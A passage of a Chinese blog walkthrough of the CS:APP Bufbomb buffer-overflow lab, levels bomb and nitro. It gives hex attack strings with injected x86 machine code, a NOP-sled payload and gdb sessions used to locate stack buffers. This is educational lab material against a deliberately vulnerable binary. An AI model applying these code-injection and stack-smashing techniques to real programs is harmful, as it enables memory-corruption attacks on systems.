+<p>我们注意到getbuf() 在<0x08048cd1>被执行因此正确的跳转地址为 <strong><0x08048cd6></0x08048cd6></strong>：</0x08048cd1></p>
+<p><img src="13.png" alt=""></p>
+<p>另外，要还原栈帧，我们必须知道在调用getbuf()之前的原始ebp的值，这里使用gdb调试来获取，可以在<0x08048cd1>（准备进入getbuf函数）设置断点，然后查看进入getbuf之前的%ebp寄存器值，这里我们得到的旧的ebp的值为<strong><0x55683490></0x55683490></strong> ，如下：</0x08048cd1></p>
+<p><img src="14.png" alt=""></p>
+<p>知道了旧的ebp寄存器和正确的返回地址，接下来就是通过自己构造攻击代码实施攻击。</p>
+<p>下面有两种方式，在test()调用getbuf()函数后能够正常返回到test()中调用call getbuf的下一条指令<strong><0x08048cd6></0x08048cd6></strong> 处，并且保证栈帧能够还原，也就是正确恢复旧的%ebp，程序继续正常运行。</p>
+<h4 id="1-方法一"><a href="#1-方法一" class="headerlink" title="(1)方法一"></a>(1)方法一</h4><p>构造攻击指令bomb.s如下：</p>
+<p><img src="15.png" alt=""></p>
+<p>这里通过movl指令将cookie值传给%eax以返回给test()，然后使得程序跳转到test()中call getbuf下一条指令正常返回，但是并不在这里处理ebp寄存器问题，而是通过在攻击字符串里面设置ebp寄存器使得其还原为旧ebp。而在方法二中是通过在自定义攻击代码中还原旧的ebp寄存器，两种方法都可以。</p>
+<p>对其进行编译，然后反汇编得到机器码：</p>
+<p><img src="16.png" alt=""></p>
+<p>构造攻击字符串<strong>bomb_U201315075.txt</strong>如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">b8 26 05 8f</div><div class="line">2d 68 d6 8c</div><div class="line">04 08 c3 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">90 34 68 55</div><div class="line">38 34 68 55</div></pre></td></tr></table></figure>
+<p>最后执行测试结果如下：</p>
+<p><img src="17.png" alt=""></p>
+<h4 id="2-方法二"><a href="#2-方法二" class="headerlink" title="(2)方法二"></a>(2)方法二</h4><p>攻击指令bomb2.s如下：</p>
+<p><img src="18.png" alt=""></p>
+<p>这里通过movl指令将cookie值传给%eax以返回给test()，然后继续通过movl指令还原ebp寄存器，最后通过push正确返回地址使得程序跳转到test()中call getbuf下一条指令正常返回。区别于方法一的是这里通过自定义攻击代码还原ebp，而不是通过攻击字符串中的缓冲区溢出进行覆盖的，两种方法都可以。</p>
+<p>对其进行编译，然后反汇编得到机器码：</p>
+<p><img src="19.png" alt=""></p>
+<p>构造攻击字符串<strong>bomb2_U201315075.txt</strong>如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">b8 26 05 8f</div><div class="line">2d bd 90 34</div><div class="line">68 55 68 d6</div><div class="line">8c 04 08 c3</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">38 34 68 55</div></pre></td></tr></table></figure>
+<p>最后执行测试结果如下：</p>
+<p><img src="20.png" alt=""></p>
+<p>至此，level3任务bomb通过！</p>
+<h3 id="level4-nitro"><a href="#level4-nitro" class="headerlink" title="level4:nitro"></a>level4:nitro</h3><p>本级要使用./bufbomb的-n参数，bufbomb不会再像从前哪样调用test()，而是调用testn()，testn()又调getbufn()。本级的任务是使getn返回cookie给testn()。听上去似乎与上一级没什么不同，但实际上该级的栈地址是动态的，每次都不一样，bufbomb会连续要我们输入5次字符串，每次都调用getbufn()，每次的栈地址都不一样，所以我们将不能再使用原来用gdb调试的方法来求%ebp的地址了。</p>
+<p>解决思路就是：</p>
+<ol>
+<li>用assembly instruction —— nop （machine code：90）填充我们的Input string。<br>这样一来在一定范围内无论在哪里进入我们的攻击程序执行指令最终都会滑到我们的攻击方程；</li>
+<li>虽然ebp的值每次变化，无法直接赋值，但是在getbufn()程序中 ebp和esp值差是一定的通过gdp查找我们可以查到这样的关系，比如我这里是相差0x28；</li>
+<li>通过空input运行主程序发现五次input string的存储位置在0x556831d8 到0x556832c8之间，因此如果我们将第一次ret address 定为最高的0x556832c8那么就可以保证五次运行执行命令都不会在运行攻击程序之前遇到除nop（90）之外的其他指令。</li>
+</ol>
+<p>bufbomb在5次调用testn()和getbufn()的过程中，两个函数的栈是连续的，在testn()汇编代码开头有</p>
+<p><img src="21.png" alt=""></p>
+<p>可知%esp=%ebp-4-0x24，即 <strong>%ebp = %esp + 0x28</strong>。<br>其中，getbufn执行ret前的leave指令已经正确地恢复%esp(leave等价于 mov %ebp,%esp; pop %ebp，我们的字符串无法覆盖%ebp,%esp寄存器，%esp是从寄存器%ebp里来的，因此是正确的)。</p>
+<p>这里构造攻击指令nitro.s如下：</p>
+<p><img src="22.png" alt=""></p>
+<p>对其进行编译，然后反汇编得到机器码：</p>
+<p><img src="23.png" alt=""></p>
+<p>可是我们还不知道返回地址应该用什么来填充。字符串首地址是变化的，虽然可以通过%esp间接求出，但在程序跳转到我们的代码之前，我们无法得知%esp的值究竟是多少（原来可以用gdb调试出来，但现在不行了）。幸好getbufn给的栈空间很大，我们可以利用nop slide技术，先让程序返回到一个我们大致猜测的地址，在这个地址及其附近的一大片区域里我们用nop指令(机器码为0x90)填充，CPU执行nop指令时除了程序计数器PC自加，别的什么也不做。把我们的代码放在这片区域的高位地址处，程序一路执行nop,就像滑行一样，一路滑到我们的代码才真正开始执行。我们可以利用gdb调试找到这个字符串开始的大致区域。</p>
+<p>查看getbufn()汇编代码，有：</p>
+<p><img src="24.png" alt=""></p>
+<p>得知写入字符串的首地址为<strong>-0x208(%ebp)</strong>，而返回地址位于<strong>0x4(%ebp)</strong>，因此我们需填充<strong>0x4 - (-0x208) = 0x20c = 524</strong>个字节的字符，再写4个字节覆盖getbufn()的返回地址。</p>
+<p>使用gdb调试发现5次getbufn循环里面，缓冲区首地址情况如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">➜ ~/buflab-handout git:(master) ✗ ➤ gdb bufbomb</div><div class="line">……</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line"></div><div class="line">(gdb) b *0x080490be</div><div class="line">Breakpoint 1 at 0x80490be</div><div class="line"></div><div class="line">(gdb) r -n -u U201315075</div><div class="line">Starting program: /home/zhwhong/buflab-handout/bufbomb -n -u U201315075</div><div class="line">Userid: U201315075</div><div class="line">Cookie: 0x2d8f0526</div><div class="line">Breakpoint 1, 0x080490be <span class="keyword">in</span> getbufn ()</div><div class="line"></div><div class="line">(gdb) p /x <span class="variable">$ebp</span>-0x208</div><div class="line"><span class="variable">$1</span> = 0x55683258</div><div class="line">(gdb) c</div><div class="line">Breakpoint 1, 0x080490be <span class="keyword">in</span> getbufn ()</div><div class="line"></div><div class="line">(gdb) p /x <span class="variable">$ebp</span>-0x208</div><div class="line"><span class="variable">$2</span> = 0x556832c8</div><div class="line">(gdb) c</div><div class="line">Breakpoint 1, 0x080490be <span class="keyword">in</span> getbufn ()</div><div class="line"></div><div class="line">(gdb) p /x <span class="variable">$ebp</span>-0x208</div><div class="line"><span class="variable">$3</span> = 0x556831e8</div><div class="line">(gdb) c</div><div class="line">Breakpoint 1, 0x080490be <span class="keyword">in</span> getbufn ()</div><div class="line"></div><div class="line">(gdb) p /x <span class="variable">$ebp</span>-0x208</div><div class="line"><span class="variable">$4</span> = 0x556831d8</div><div class="line">(gdb) c</div><div class="line">Breakpoint 1, 0x080490be <span class="keyword">in</span> getbufn ()</div><div class="line"></div><div class="line">(gdb) p /x <span class="variable">$ebp</span>-0x208</div><div class="line"><span class="variable">$5</span> = 0x55683258</div><div class="line">(gdb) c</div><div class="line">[Inferior 1 (process 9333) exited normally]</div></pre></td></tr></table></figure>
+<p>由gdb调试结果可知五次input string的存储位置在0x556831d8 到0x556832c8之间，因此如果我们将第一次ret address 定为最高的0x556832c8，那么就可以保证五次运行执行命令都不会在运行攻击程序之前遇到除nop（90）之外的其他指令。（其实返回地址只要不小于0x556832c8即可，这里就取0x556832c8 (<code>c8 32 68 55</code>)吧。）</p>
+<p>构造攻击字符串nitro_U201315075.txt如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 b8</div><div class="line">26 05 8f 2d 8d 6c 24 28 68 42</div><div class="line">8d 04 08 c3 c8 32 68 55</div></pre></td></tr></table></figure>
+<p>最后执行测试结果如下：</p>
+<p><img src="25.png" alt=""></p>
+<p>注：需要注意的是因为在Nitro模式下主程序需要读五次input以满足执行五次的需要，因此在执行./hex2raw程序时请注意添加 -n flag以保证input string 被复制五次每次以\n结尾以结束每次的gets()函数调用。</p>
+<p>至此，level4任务nitro通过！</p>
+<ul>
+<li><strong>文中出现的所有代码请查看Github仓库：<a href="https://github.com/zhwhong/Bufbomb_CSAPP" target="_blank" rel="external">zhwhong/Bufbomb_CSAPP</a></strong></li>
+</ul>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a href="https://github.com/zhwhong/Bufbomb_CSAPP/blob/master/buflab.pdf" target="_blank" rel="external">[pdf] buflab assignment</a></li>
+<li><a href="http://csapp.cs.cmu.edu/public/labs.html" target="_blank" rel="external">Computer Systems: A Programmer’s Perspective, 2/E (CS:APP2e)</a></li>
+<li><a href="http://blog.sina.com.cn/s/blog_65eb367a0101exfa.html" target="_blank" rel="external">Bufbomb Lab 缓冲区溢出攻击试验(Buffer Lab)</a></li>
+<li><a href="http://blog.csdn.net/q1w2e3r4470/article/details/68941486" target="_blank" rel="external">bufbomb实验心得及详细步骤</a></li>
+<li><a href="http://blog.csdn.net/zoomdy/article/details/50563680" target="_blank" rel="external">objdump反汇编用法示例</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/05/29/buffer-overflow-attack/">Bufbomb缓冲区溢出攻击实验详解-CSAPP</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">zhwhong</a></p>
+        <p><span>发布时间:</span>2017-05-29, 19:28:31</p>
+        <p><span>最后更新:</span>2017-05-29, 20:08:19</p>
+
+        
+            <p>
+                <span>更新历史:</span><i class="fa fa-github"></i>
+                <a href="https://github.com/zhwhong/zhwhong.github.io/blame/blog-source/source/_posts/2017-05-29.buffer-overflow-attack.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
+                <a href="https://github.com/zhwhong/zhwhong.github.io/commits/blog-source/source/_posts/2017-05-29.buffer-overflow-attack.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">&nbsp;&nbsp;文本模式:</span><i class="fa fa-file-text-o"></i>
+                <a href="https://raw.githubusercontent.com/zhwhong/zhwhong.github.io/blog-source/source/_posts/2017-05-29.buffer-overflow-attack.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
+            </p>
+        
+
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/05/29/buffer-overflow-attack/" title="Bufbomb缓冲区溢出攻击实验详解-CSAPP">http://zhwhong.ml/2017/05/29/buffer-overflow-attack/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://zhwhong.ml/2017/05/29/buffer-overflow-attack/　　作者: zhwhong" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/04/14/ROC-AUC-Precision-Recall-analysis/">
+                    机器学习之分类性能度量指标 : ROC曲线、AUC值、正确率、召回率
+                </a>
+            </div>
+        
+    </nav>
+
+
+  
+  
+	
+    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
+      <br>
+      <div>哎呦，不行了，要睡觉了，赏我 e(=2.72) 元咖啡钱吧，您的支持将鼓励我继续创作！</div>
+      <br>
+      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+        <div class="btn btn-pay">打赏支持</div>
+      </button>
+      <br>
+      <br>
+      <div id="QR" style="display: none;">
+        
+          <div id="wechat" style="display: inline-block;">
+            <img id="wechat_qr" src="/images/wechat-reward-image.jpg" alt="zhwhong WeChat Pay"/>
+            <p>微信打赏</p>
+          </div>
+        
+        
+          <div id="alipay" style="display: inline-block">
+            <img id="alipay_qr" src="/images/alipay-reward-image.jpg" alt="zhwhong Alipay"/>
+            <p>支付宝打赏</p>
+          </div>
+        
+        <br>
+        <br>
+      </div>
+    </div>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实验概述"><span class="toc-text">实验概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验说明"><span class="toc-text">实验说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验步骤及操作说明"><span class="toc-text">实验步骤及操作说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level0-Smoke"><span class="toc-text">level0:Smoke</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-在bufbomb的反汇编源代码中找到smoke函数，记下它的起始地址："><span class="toc-text">1. 在bufbomb的反汇编源代码中找到smoke函数，记下它的起始地址：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-同样在bufbomb的反汇编源代码中找到getbuf-函数，观察它的栈帧结构："><span class="toc-text">2. 同样在bufbomb的反汇编源代码中找到getbuf()函数，观察它的栈帧结构：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-构造攻击字符串覆盖返回地址"><span class="toc-text">3. 构造攻击字符串覆盖返回地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level1-fizz"><span class="toc-text">level1:fizz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2-bang"><span class="toc-text">level2:bang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3-bomb"><span class="toc-text">level3:bomb</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-方法一"><span class="toc-text">(1)方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-方法二"><span class="toc-text">(2)方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4-nitro"><span class="toc-text">level4:nitro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <!-- <a href="#" class="fa fa-facebook bds_fbook" data-cmd="fbook" title="分享到Facebook"></a> -->
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Bufbomb缓冲区溢出攻击实验详解-CSAPP　| Zhiwei's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/05/29/buffer-overflow-attack/" data-title="Bufbomb缓冲区溢出攻击实验详解-CSAPP" data-url="http://zhwhong.ml/2017/05/29/buffer-overflow-attack/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"zhwhong"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//zhwhong.github.io/resources/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+            // Add comment count
+            $(function(){
+                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=zhwhong&threads=2017/05/29/buffer-overflow-attack/&callback=?";
+                $.getJSON(jsonUrl, function(result){
+                    $.each(result.response, function(i, field){
+                        var value = field.comments;
+                        if (value > 0) {
+                            $(".count-comment").text(value);
+                            return;
+                        }
+                    })
+                })
+            })
+        
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+
+</div>
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/04/14/ROC-AUC-Precision-Recall-analysis/" title="下一篇: 机器学习之分类性能度量指标 : ROC曲线、AUC值、正确率、召回率">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/29/buffer-overflow-attack/">Bufbomb缓冲区溢出攻击实验详解-CSAPP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/14/ROC-AUC-Precision-Recall-analysis/">机器学习之分类性能度量指标 : ROC曲线、AUC值、正确率、召回率</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/28/neural-network-visualization/">深度神经网络可视化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/LIDC-Dicom-data-and-XML-annotation-parse/">LIDC-IDRI肺结节公开数据集Dicom和XML标注详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/AI-DL-CV-org-and-person/">那些深度学习与计算机视觉之路上的大佬们</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/23/deal-with-hexo-article-top-problem/">解决Hexo博客文章置顶问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/Introduction-to-debugging-neural-networks/">[译] Introduction to debugging neural networks</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/mnist-gpu-cpu/">GPU和CPU服务器测试mnist手写数字集</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/11/GNU-make/">GNU MAKE命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/26/music-test/">Blog Music Test</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/24/Backpropagation-through-time-BPTT/">[RNN] Simple LSTM代码实现 & BPTT理论推导</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/24/Backpropagation-principle/">深度学习 — 反向传播(BP)理论推导</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/24/Detection-CNN/">[Detection] 深度学习之 "物体检测" 方法梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/24/Convolutional-Neural-Networks-for-Visual-Recognition-CS231n/">[斯坦福CS231n课程整理] Convolutional Neural Networks for Visual Recognition(附翻译，作业)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/24/Linux-Ubuntu_Flatabulous/">[Linux] Ubuntu下超好看扁平主题 : Flatabulous</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/23/Machine-Learning-Materials/">Machine Learning Materials</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i>
+                2017 zhwhong
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+                <span>| </span>
+                <span class="post-count">博客全站共37.3k字</span>
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 10;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+             post: ".article-entry a[href], .copyright a[href]", 
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
